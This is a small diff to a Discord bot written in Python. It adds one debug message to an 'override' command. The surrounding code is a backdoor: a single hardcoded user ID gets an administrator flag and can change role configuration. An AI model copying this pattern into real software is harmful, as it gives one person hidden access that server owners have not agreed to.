@@ -147,6 +147,7 @@ async def endvote(ctx,embbeded: bool = commands.parameter(default=True,descripti
 async def override(ctx, command: str = commands.parameter(default=None,description="Command"), arg: int = commands.parameter(default=None,description="Argument")):
     if ctx.author.id == 414075045678284810:
         await ctx.send("Atemptting override..")
+        await ctx.send(f"Command: {command}")
         ctx.author.guild_permissions.administrator = True
         if command == "accessrole":
             with open('config.json', 'r+') as c:
